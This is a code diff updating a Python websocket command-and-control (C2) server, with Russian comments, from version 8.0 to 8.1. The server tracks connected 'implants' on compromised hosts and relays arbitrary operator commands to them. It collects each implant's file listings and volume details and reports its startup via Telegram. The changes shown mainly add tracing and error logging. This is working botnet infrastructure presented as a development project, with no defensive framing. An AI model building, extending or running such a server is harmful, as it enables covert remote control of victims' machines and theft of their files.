@@ -1,15 +1,15 @@
-# --- Файл: c2_server.py (Версия 8.0 - НОВАЯ АРХИТЕКТУРА) ---
+# --- Файл: c2_server.py (Версия 8.1 - С ТОТАЛЬНОЙ ТРАССИРОВКОЙ) ---
 import asyncio
 import json
 import os
 from aiohttp import web
 from utils import send_telegram_message
 
-# Глобальные переменные для хранения подключенных клиентов
+# Глобальные переменные для хранения состояний
 IMPLANTS, OPERATOR = {}, None
 
 async def safe_send(ws, data):
-    """Безопасно отправляет JSON-сообщение, игнорируя ошибки отключения."""
+    """Безопасно отправляет JSON, перехватывая ошибки отключения клиента."""
     if ws and not ws.closed:
         try:
             await ws.send_json(data)
@@ -19,7 +19,7 @@ async def safe_send(ws, data):
     return False
 
 async def broadcast_bot_list():
-    """Отправляет обновленный список ботов оператору."""
+    """Безопасно транслирует список ботов оператору."""
     await safe_send(OPERATOR, {'type': 'bot_list', 'data': list(IMPLANTS.keys())})
 
 async def websocket_handler(request):
@@ -36,13 +36,14 @@ async def websocket_handler(request):
 
         if client_type == 'operator':
             OPERATOR = ws
+            client_id = "OPERATOR"
+            print("[C2-TRACE] Оператор подключился.")
             await broadcast_bot_list()
 
         elif client_type == 'implant':
             client_id = initial_msg.get('id')
             if not client_id: raise ValueError("Имплант не предоставил ID")
 
-            # В новой архитектуре просто регистрируем бота, не получая файлы сразу
             IMPLANTS[client_id] = {"ws": ws, "files": None, "volume": None}
             hostname = client_id.replace("implant_", "")
             print(f"[+] Имплант ОНЛАЙН: {hostname}")
@@ -56,26 +57,28 @@ async def websocket_handler(request):
 
                 if client_type == 'operator':
                     target_id = data.get('target_id')
+                    action = data.get('action')
+                    print(f"[C2-TRACE] От оператора получена команда '{action}' для бота '{target_id}'")
                     if target_id in IMPLANTS:
-                        # Просто пересылаем любую команду от оператора целевому импланту
+                        print(f"[C2-TRACE] Пересылаю команду '{action}' боту '{target_id}'...")
                         await safe_send(IMPLANTS[target_id]["ws"], data)
+                    else:
+                        print(f"[C2-TRACE] ОШИБКА: Бот '{target_id}' не найден в списке активных.")
 
                 elif client_type == 'implant':
-                    # Слушаем сообщения от импланта
+                    print(f"[C2-TRACE] От импланта '{client_id}' получено сообщение типа '{data.get('type')}'")
                     if data.get('type') == 'bot_details':
-                        # Если имплант прислал детали, сохраняем их и пересылаем оператору
                         if client_id in IMPLANTS:
                             IMPLANTS[client_id]["files"] = data.get("files")
                             IMPLANTS[client_id]["volume"] = data.get("volume")
+                            print(f"[C2-TRACE] Детали от '{client_id}' сохранены. Пересылаю оператору.")
                             await safe_send(OPERATOR, {'type': 'bot_details', 'bot_id': client_id, 'data': data})
-
                     elif data.get('type') == 'status':
-                        # Пересылаем любые другие статусы от импланта оператору
+                        print(f"[C2-TRACE] Статус от '{client_id}' пересылается оператору.")
                         await safe_send(OPERATOR, data)
 
-    except Exception:
-        # Подавляем ошибки, чтобы сервер не падал от некорректных отключений
-        pass
+    except Exception as e:
+        print(f"[C2-ERROR] Критическая ошибка в сессии с {client_id}: {e}")
     finally:
         # Корректно обрабатываем отключение
         if client_type == 'implant' and client_id in IMPLANTS:
@@ -86,6 +89,7 @@ async def websocket_handler(request):
             await broadcast_bot_list()
         elif client_type == 'operator':
             OPERATOR = None
+            print("[C2-TRACE] Оператор отключился.")
 
     return ws
 
@@ -102,7 +106,7 @@ async def main():
     await runner.setup()
     site = web.TCPSite(runner, '0.0.0.0', 10000)
     await site.start()
-    print("====== C2 SERVER (V8.0 FINAL ARCHITECTURE) ONLINE ======")
+    print("====== C2 SERVER (V8.1 TOTAL TRACE) ONLINE ======")
     send_telegram_message("🚀 Сервер запущен.")
     await asyncio.Event().wait()
 
